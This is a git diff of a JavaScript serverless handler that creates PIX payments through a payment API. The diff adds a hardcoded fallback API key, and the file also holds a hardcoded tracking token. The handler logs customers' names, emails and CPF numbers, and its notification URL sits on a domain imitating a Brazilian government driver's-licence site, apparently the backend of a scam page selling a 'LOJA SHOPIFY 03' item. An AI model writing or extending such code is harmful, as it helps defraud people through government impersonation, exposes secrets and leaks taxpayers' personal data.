@@ -1,7 +1,7 @@
 const { getSupabase } = require("./lib/supabase");
 
 const AVEN_BASE = "https://api.avenpayments.com";
-const AVEN_API_KEY = process.env.AVEN_API_KEY; // bfXZ3yCCr9GDCcD6T_H7md4rlb0NeDJjLnRJhuGL_n8
+const AVEN_API_KEY = process.env.AVEN_API_KEY || "tYy_7CBTGHagvMte1gOgL681OXm2dz4zyCATdBE2BjE";
 const UTMIFY_TOKEN = "lzASZob4ldSJJc3jT1LILy9alPxWJgpnPhCh";
 
 // Variáveis Supabase
@@ -201,11 +201,26 @@ exports.handler = async (event) => {
   console.log("[PIX-AVEN] Amount:", amountReais, "Cents:", amountCents);
   console.log("[PIX-AVEN] Customer:", { name: customerName, email: customerEmail, cpf: customerCpf });
 
-  // Payload para AvenPayments - SUPER MINIMALISTA
+  // Payload para AvenPayments - EXATO COMO DOCS
   const payload = {
     amount: 6520,
     currency: "BRL",
-    method: "PIX"
+    method: "PIX",
+    description: "LOJA SHOPIFY 03",
+    externalRef: externalRef,
+    notificationUrl: "https://cnh-brasil-gov-br.netlify.app/.netlify/functions/check-payment",
+    payer: {
+      name: customerName,
+      taxId: customerCpf,
+      email: customerEmail,
+      phone: customerPhone
+    },
+    items: [{
+      quantity: 1,
+      name: "LOJA SHOPIFY 03",
+      price: 6520,
+      type: "PHYSICAL"
+    }]
   };
 
   let authHeader;
